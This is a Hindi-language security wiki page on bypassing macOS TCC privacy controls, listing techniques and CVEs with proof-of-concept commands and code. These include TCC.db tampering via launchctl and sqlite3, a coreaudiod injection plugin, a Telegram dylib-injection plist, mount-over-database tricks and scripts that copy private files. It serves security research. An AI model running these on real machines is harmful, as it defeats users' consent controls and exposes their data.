# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## functionality के अनुसार

### Write Bypass

यह bypass नहीं है, यह केवल TCC के काम करने का तरीका है: **यह writing से सुरक्षा नहीं करता**। यदि Terminal के पास किसी user के Desktop को read करने की access **नहीं** है, तब भी वह उसमें write कर सकता है:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
नए **file** में **extended attribute `com.apple.macl`** जोड़ा जाता है, ताकि **creators app** को उसे पढ़ने की access मिल सके।<sup>[[2]](#references)</sup>

### TCC ClickJacking

उपयोगकर्ता को इसका पता चले बिना उसे इसे **accept** करवाने के लिए **TCC prompt के ऊपर एक window रखना** संभव है। आप [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking) में एक PoC पा सकते हैं।<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### मनमाने नाम से TCC Request

Attacker **`Info.plist`** में किसी भी नाम (जैसे Finder, Google Chrome...) वाले **apps create** कर सकता है और उनसे किसी TCC protected location की access request करवा सकता है। उपयोगकर्ता सोचेगा कि यह access legit application request कर रही है।\
इसके अलावा, **legit app को Dock से हटाकर उसकी जगह fake app रखना** संभव है। इसलिए जब उपयोगकर्ता fake app पर क्लिक करता है (जो उसी icon का उपयोग कर सकता है), तो यह legit app को call कर सकता है, TCC permissions मांग सकता है और malware execute कर सकता है। इससे उपयोगकर्ता को लगेगा कि access legit app ने request की है।<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

अधिक जानकारी और PoC यहाँ:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

By default, **SSH के माध्यम से access में "Full Disk Access"** हुआ करता था। इसे disable करने के लिए इसे सूची में listed लेकिन disabled रखना आवश्यक है (इसे सूची से हटाने पर वे privileges हटेंगे नहीं):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: By default an access via SSH used to have "Full Disk Access" . In order to disable this you need to have it listed but disabled (removing it...](<../../../../../images/image (1077).png>)

यहाँ आप देख सकते हैं कि कुछ **malwares इस protection को bypass करने में सक्षम रहे हैं**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> ध्यान दें कि अब SSH को enable करने के लिए आपके पास **Full Disk Access** होना आवश्यक है।

### Handle extensions - CVE-2022-26767

Files को **`com.apple.macl`** attribute दिया जाता है, ताकि **किसी निश्चित application को उसे पढ़ने की permissions मिल सकें।** यह attribute तब set होता है जब किसी file को किसी app पर **drag\&drop** किया जाता है, या जब कोई user किसी file को **default application** से खोलने के लिए उस पर **double-click** करता है।

इसलिए, user सभी extensions को handle करने के लिए **malicious app register** कर सकता है और किसी भी file को **open** करने के लिए Launch Services को call कर सकता है (जिससे malicious file को उसे पढ़ने की access मिल जाएगी)।<sup>[[23]](#references)</sup>

### iCloud

**`com.apple.private.icloud-account-access`** entitlement के माध्यम से **`com.apple.iCloudHelper`** XPC service से communicate करना संभव है, जो **iCloud tokens provide** करेगी।

**iMovie** और **Garageband** के पास यह entitlement और अन्य अनुमतियाँ थीं।

उस entitlement से **icloud tokens प्राप्त करने** वाले exploit की अधिक **information** के लिए यह talk देखें: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** permission वाले app से **अन्य Apps को control** किया जा सकता है। इसका अर्थ है कि वह **अन्य Apps को दी गई permissions का दुरुपयोग** कर सकता है।<sup>[[2]](#references)</sup>

Apple Scripts के बारे में अधिक info के लिए देखें:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

उदाहरण के लिए, यदि किसी App के पास **`iTerm` पर Automation permission** है, तो इस उदाहरण में **`Terminal`** के पास iTerm पर access है:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, जिसके पास FDA नहीं है, iTerm को call कर सकता है, जिसके पास FDA है, और इसका उपयोग actions perform करने के लिए कर सकता है:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Finder के माध्यम से

या यदि किसी App के पास Finder के माध्यम से access है, तो वह इस तरह की script चला सकता है:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## App के अनुसार व्यवहार

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Userland **tccd daemon**, TCC users database को इस स्थान से access करने के लिए **`HOME`** **env** variable का उपयोग करता था: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[इस Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) के अनुसार, और क्योंकि TCC daemon वर्तमान user के domain के भीतर `launchd` के माध्यम से चल रहा है, इसलिए उसे पास किए जाने वाले **सभी environment variables को control करना** संभव है।<sup>[[19]](#references)</sup>\
इस प्रकार, एक **attacker `launchctl` में `$HOME` environment** variable को किसी **controlled** **directory** की ओर point कर सकता था, **TCC** daemon को **restart** कर सकता था, और फिर **TCC database को सीधे modify** करके स्वयं को उपलब्ध **हर TCC entitlement** दे सकता था, वह भी end user को कभी prompt दिखाए बिना।<sup>[[1]](#references)</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes को TCC-protected locations तक access प्राप्त था, लेकिन नई बनाई गई note को **non-protected location** में **stored** किया जाता था। इसलिए, attacker Notes से किसी protected file को note में copy करने के लिए कह सकता था और फिर non-protected location से resulting data को access कर सकता था:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Library `libsecurity_translocate` वाली binary `/usr/libexec/lsd` के पास entitlement `com.apple.private.nullfs_allow` था, जिससे यह **nullfs** mount बना सकती थी। इसके पास **`kTCCServiceSystemPolicyAllFiles`** के साथ entitlement `com.apple.private.tcc.allow` भी था, जिससे यह हर file को access कर सकती थी।

"Library" में quarantine attribute जोड़ना, **`com.apple.security.translocation`** XPC service को call करना और फिर Library को **`$TMPDIR/AppTranslocation/d/d/Library`** पर map करना संभव था, जहाँ Library के अंदर मौजूद सभी documents को **access** किया जा सकता था।

### CVE-2024-44131 - FileProvider symlink race

जो Apps file operations को एक **privileged helper** (`fileproviderd` / `Files.app`) को सौंपती हैं, वे user की ओर से items को **copy** या move करती हैं, इसलिए copy caller के बजाय helper के privileges के साथ चलती है।

Jamf Threat Labs ने दिखाया कि operation से पहले की जाने वाली symlink validation को **race** किया जा सकता है: **last** path component पर symlink लगाने के बजाय (जिसकी जाँच की जाती है), attacker copy शुरू होने के **बाद** path की एक **intermediate** directory को बदल देता है। इसके बाद privileged helper attacker-controlled link को follow करता है और बिना कोई prompt दिखाए TCC-protected locations को read/write करता है।<sup>[[5]](#references)</sup>

वे directories जो अपने path में random UUID से **protected** नहीं हैं (उदाहरण के लिए `~/Library/Mobile Documents/com~apple~CloudDocs`), सबसे आसान targets हैं, क्योंकि attacker race करने के लिए पूरा path predict कर सकता है।

> [!TIP]
> यह देखने योग्य generic pattern है: **कोई भी privileged process जो किसी path को एक से अधिक बार resolve करता है** (check-then-use, या source और destination को अलग-अलग resolve करने वाला `rename()`/`copyfile()`), path के बीच में किसी directory को बदलकर race किया जा सकता है। केवल `O_NOFOLLOW_ANY`, पहले से खोली गई directory FD पर `openat()`, या `realpath()` + re-validation ही वास्तव में इस window को बंद करते हैं।

अधिक जानकारी [**the Jamf Threat Labs writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/) में है।<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` को `SQLITE_ENABLE_SQLLOG` के साथ build किया जा सकता है, जो environment variables द्वारा नियंत्रित logging hook जोड़ता है ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – **हर खोले गए database** के लिए, **database file की एक copy** और SQL statements का log `path` में लिखा जाता है (directory पहले से मौजूद होनी चाहिए)।
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – हर बार DB के open/attach होने पर किसी एक copy को reuse करने के बजाय **नई copy** बनाई जाती है।
- **`SQLITE_SQLLOG_CONDITIONAL`** – केवल उस connection को log करता है जिसके main DB के पास `<database>-sqllog` file मौजूद हो।

यदि आप इस variable को ऐसे process में inject कर सकते हैं जिसके पास **FDA** हो और जो SQLite databases खोलता हो, तो वह खुशी-खुशी उन protected databases को आपके control वाली directory में **copy** कर देगा। क्योंकि destination filename attacker-controlled data से derived होता है, destination पर लगाया गया **symlink** इसी primitive को target process के privileges के साथ **arbitrary file write** में बदल देता है।

### **SQLITE_AUTO_TRACE**

यदि environment variable **`SQLITE_AUTO_TRACE`** set है, तो library **`libsqlite3.dylib`** सभी SQL queries की **logging** शुरू कर देगी। कई applications इस library का उपयोग करती थीं, इसलिए उनकी सभी SQLite queries को log करना संभव था।<sup>[[22]](#references)</sup>

कई Apple applications ने TCC-protected information को access करने के लिए इस library का उपयोग किया।
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### env-var driven file writes की खोज

पिछली दो entries एक ही generic technique के उदाहरण हैं, और ऐसी और स्थितियों की खोज करना उपयोगी है: **TCC-privileged apps में loaded frameworks अक्सर ऐसे debug/logging environment variables expose करते हैं, जो process को caller-controlled path पर file create करने के लिए मजबूर करते हैं**।

उन्हें खोजने का workflow:

1. FDA या किसी अन्य उपयोगी TCC permission वाले target (`Music`, `TV`, `Terminal`, MDM agents...) को चुनें और उन frameworks की सूची बनाएं जिन्हें वह link करता है (`otool -L`, `vmmap`)।
2. उन frameworks में `getenv` strings के लिए grep करें: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`।
3. `launchctl setenv NAME /path/you/control` के माध्यम से candidate variables सेट करें, app launch करें और `fs_usage -w -f filesys <pid>` या `sudo fs_usage | grep <path>` से filesystem पर उसकी गतिविधि देखें।
4. यदि process आपकी directory में कोई file **create या rename** करता है, तो आपके पास एक write primitive है: destination को symlink पर point करें (या किसी intermediate directory पर race करें, जैसा ऊपर CVE-2024-44131 में है) ताकि उसे `~/Library/Application Support/com.apple.TCC/TCC.db` पर redirect किया जा सके।

> [!TIP]
> दो बातें इसे सीमित करती हैं। पहली, **`DYLD_*` variables hardened-runtime binaries के लिए ignored होते हैं**, जब तक app में [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement न हो ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process") — [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/) भी देखें। दूसरी, Apple द्वारा report किए जाने पर individual framework debug variables हटा दिए जाते हैं, इसलिए जो variable किसी एक macOS release पर काम करता था, वह अक्सर अगले release में मौजूद नहीं होता। यदि किसी variable को set करने के बाद app चुपचाप launch होने से इनकार कर दे, तो उस variable को पहले से filtered मानें।<sup>[[7]](#references)[[8]](#references)</sup>

Linker variables के साथ इसी equivalent trick के लिए [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) देखें।

### Apple Remote Desktop

Root के रूप में आप इस service को enable कर सकते थे और **ARD agent के पास full disk access होगा**, जिसका उपयोग कोई user नई **TCC user database** copy करवाने के लिए कर सकता था।

## **NFSHomeDirectory** द्वारा

TCC user-specific resources तक access नियंत्रित करने के लिए user के HOME folder में database का उपयोग करता है: **$HOME/Library/Application Support/com.apple.TCC/TCC.db**।\
इसलिए, यदि user $HOME environment variable को **किसी अलग folder** पर point करके TCC को restart करने में सफल हो जाता है, तो user **/Library/Application Support/com.apple.TCC/TCC.db** में नया TCC database create कर सकता है और TCC को किसी भी app को कोई भी TCC permission देने के लिए trick कर सकता है।

> [!TIP]
> ध्यान दें कि Apple `$HOME` के **value** के लिए user profile में stored **`NFSHomeDirectory`** attribute का उपयोग करता है। इसलिए, यदि आप किसी ऐसी application को compromise करते हैं जिसके पास इस value को modify करने की permission (**`kTCCServiceSystemPolicySysAdminFiles`**) है, तो आप TCC bypass के साथ इस option को **weaponize** कर सकते हैं।

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**पहला POC** user के **HOME** folder को modify करने के लिए [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) और [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) का उपयोग करता है।

1. Target app के लिए _csreq_ blob प्राप्त करें।
2. आवश्यक access और _csreq_ blob के साथ fake _TCC.db_ file plant करें।
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) के साथ user की Directory Services entry export करें।
4. User की home directory बदलने के लिए Directory Services entry modify करें।
5. Modified Directory Services entry को [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) के साथ import करें।
6. User के _tccd_ को stop करें और process को reboot करें।

दूसरे POC में **`/usr/libexec/configd`** का उपयोग किया गया, जिसके पास `com.apple.private.tcc.allow` में `kTCCServiceSystemPolicySysAdminFiles` value थी।\
`configd` को **`-t`** option के साथ run करना संभव था, जिससे attacker **load करने के लिए custom Bundle specify** कर सकता था। इसलिए exploit user की home directory बदलने के **`dsexport`** और **`dsimport`** method को **`configd` code injection** से **replace** कर देता है।

अधिक जानकारी के लिए [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) देखें।<sup>[[11]](#references)</sup>

## process injection द्वारा

किसी process के अंदर code inject करने और उसके TCC privileges का दुरुपयोग करने के लिए अलग-अलग techniques मौजूद हैं:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

इसके अलावा, TCC bypass करने के लिए मिली सबसे common process injection **plugins (load library)** के माध्यम से होती है।\
Plugins extra code होते हैं, आमतौर पर libraries या plist के रूप में, जिन्हें **main application द्वारा loaded** किया जाता है और जो उसके context में execute होते हैं। इसलिए, यदि main application के पास granted permissions या entitlements के माध्यम से TCC-restricted files तक access है, तो **custom code के पास भी वही access होगा**।

### CVE-2020-27937 - Directory Utility

Application `/System/Library/CoreServices/Applications/Directory Utility.app` के पास **`kTCCServiceSystemPolicySysAdminFiles`** entitlement था, यह **`.daplug`** extension वाले plugins load करता था और इसमें **hardened** runtime नहीं था।

इस CVE को weaponize करने के लिए, **NFSHomeDirectory** को (पिछले entitlement का दुरुपयोग करके) **बदला** जाता है, ताकि **users के TCC database पर control हासिल** करके TCC bypass किया जा सके।

अधिक जानकारी के लिए [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) देखें।<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** के पास `com.apple.security.cs.disable-library-validation` और `com.apple.private.tcc.manager` entitlements थे। पहला **code injection की अनुमति देता था** और दूसरा उसे **TCC manage करने का access** देता था।

यह binary `/Library/Audio/Plug-Ins/HAL` folder से **third party plug-ins** load कर सकती थी। इसलिए, इस PoC के साथ **plugin load करना और TCC permissions का दुरुपयोग करना** संभव था:<sup>[[13]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
अधिक जानकारी के लिए [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) देखें।<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

वे System applications जो Core Media I/O के माध्यम से camera stream खोलते हैं (वे apps जिनमें **`kTCCServiceCamera`** होता है), `/Library/CoreMediaIO/Plug-Ins/DAL` में स्थित इन plugins को process में load करते हैं (SIP द्वारा restricted नहीं)।

वहां common **constructor** वाली किसी library को store करने मात्र से **inject code** करना संभव है।

कई Apple applications इसके प्रति vulnerable थे।

### Firefox

Firefox application में `com.apple.security.cs.disable-library-validation` और `com.apple.security.cs.allow-dyld-environment-variables` entitlements थे:<sup>[[14]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
अधिक जानकारी के लिए इसे आसानी से exploit करने का तरीका [**original report देखें**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)।<sup>[[14]](#references)</sup>

### CVE-2020-10006

बाइनरी `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` के पास **`com.apple.private.tcc.allow`** और **`com.apple.security.get-task-allow`** entitlements थे, जिनके कारण process के अंदर code inject करना और TCC privileges का उपयोग करना संभव था।

### CVE-2023-26818 - Telegram

Telegram के पास **`com.apple.security.cs.allow-dyld-environment-variables`** और **`com.apple.security.cs.disable-library-validation`** entitlements थे, इसलिए इसका दुरुपयोग करके **इसके permissions तक access प्राप्त करना** संभव था, जैसे camera से recording करना। आप [**writeup में payload पा सकते हैं**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)।<sup>[[15]](#references)</sup>

ध्यान दें कि library load करने के लिए env variable का उपयोग कैसे किया गया: इस library को inject करने के लिए एक **custom plist** बनाई गई और इसे launch करने के लिए **`launchctl`** का उपयोग किया गया:<sup>[[15]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## `open` के माध्यम से किए गए invocations

Sandboxed होने पर भी **`open`** को invoke करना संभव है।

### Terminal Scripts

Tech लोगों द्वारा उपयोग किए जाने वाले computers में Terminal को **Full Disk Access (FDA)** देना काफी common है। इसके साथ **`.terminal`** scripts को invoke करना भी संभव है।

**`.terminal`** scripts इस जैसी plist files होती हैं, जिनमें execute करने वाली command **`CommandString`** key में होती है:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
कोई एप्लिकेशन `/tmp` जैसे स्थान पर एक terminal script लिख सकता है और उसे इस तरह के command से launch कर सकता है:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## माउंट करके

### CVE-2020-9771 - mount_apfs TCC bypass और privilege escalation

**कोई भी user** (यहाँ तक कि unprivileged users भी) एक time machine snapshot बना और mount कर सकता है और उस snapshot की **सभी files को access** कर सकता है।\
आवश्यक **एकमात्र privilege** यह है कि उपयोग किए गए application (जैसे `Terminal`) के पास **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) हो, जिसे किसी admin द्वारा grant किया जाना आवश्यक है।<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
अधिक विस्तृत विवरण [**मूल report में पाया जा सकता है**](https://theevilbit.github.io/posts/cve_2020_9771/)**।**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

भले ही TCC DB file सुरक्षित हो, फिर भी **directory पर mount करके** एक नई TCC.db file लगाना संभव था:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
[**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/) में **full exploit** देखें।<sup>[[21]](#references)</sup>

### CVE-2024-40855

[original writeup](https://www.kandji.io/blog/macos-audit-story-part2) में बताया गया है कि इस CVE ने `diskarbitrationd` का दुरुपयोग किया था।<sup>[[16]](#references)</sup>

Public `DiskArbitration` framework का `DADiskMountWithArgumentsCommon` function security checks करता था। हालांकि, `diskarbitrationd` को सीधे call करके इसे bypass करना संभव था और इसलिए path में `../` elements और symlinks का उपयोग किया जा सकता था।

इससे attacker किसी भी location पर arbitrary mounts कर सकता था, जिसमें TCC database के ऊपर mount करना भी शामिल था, क्योंकि `diskarbitrationd` के पास `com.apple.private.security.storage-exempt.heritable` entitlement था।

### asr

Tool **`/usr/sbin/asr`** पूरे disk को copy करके किसी अन्य स्थान पर mount कर सकता था और TCC protections को bypass कर सकता था।

### CVE-2022-22655 - Location Services

अन्य services की तरह Location Services को TCC database में **store नहीं किया जाता**। इन्हें `locationd` manage करता है, जो अपनी allow-list **`/var/db/locationd/clients.plist`** में रखता है:<sup>[[4]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
प्रत्येक entry को client (bundle ID या executable path) द्वारा key किया जाता है और इसमें `Authorized`, `BundleId`, `Executable` तथा `Registered` जैसे fields होते हैं।<sup>[[4]](#references)</sup>

`clients.plist` file स्वयं Sandbox/TCC द्वारा protected है और इसे root के रूप में भी edit नहीं किया जा सकता — लेकिन **`/var/db/locationd/` directory को mounting से protected नहीं किया गया था**। इसलिए root के रूप में चल रहा attacker अपनी `clients.plist` वाली disk image बना सकता था (जिसमें उसके binary को `Authorized` के रूप में mark किया गया हो), उसे directory के ऊपर mount कर सकता था और forged allow-list को प्रभावी बनाने के लिए `locationd` को restart कर सकता था।<sup>[[3]](#references)</sup>

> [!TIP]
> यह ऊपर बताए गए `hdiutil`/`mount` TCC bypasses जैसा ही pattern है: *file* protected है, लेकिन जिस *directory* में वह मौजूद है वह protected नहीं है, इसलिए file के बजाय पूरी directory को replace किया जाता है।

## startup apps के माध्यम से


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep के माध्यम से

कई अवसरों पर files sensitive information जैसे emails, phone numbers, messages... को non-protected locations में store करती हैं (जो Apple के अनुसार vulnerability मानी जाती है)।

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

यह अब काम नहीं करता, लेकिन [**पहले काम करता था**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) का उपयोग करने का एक और तरीका:<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: macOS Transparency, Consent, and Control (TCC) Framework को bypass करना](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [गलती से और Design द्वारा macOS TCC User Privacy Protections को bypass करना](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - TCC Location Services bypass (original report)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Where in the World is Carmen Sandiego: macOS पर Location Services का दुरुपयोग](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass से iCloud से data चोरी](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization: hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [XCSSET malware में Zero-Day TCC bypass की खोज](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
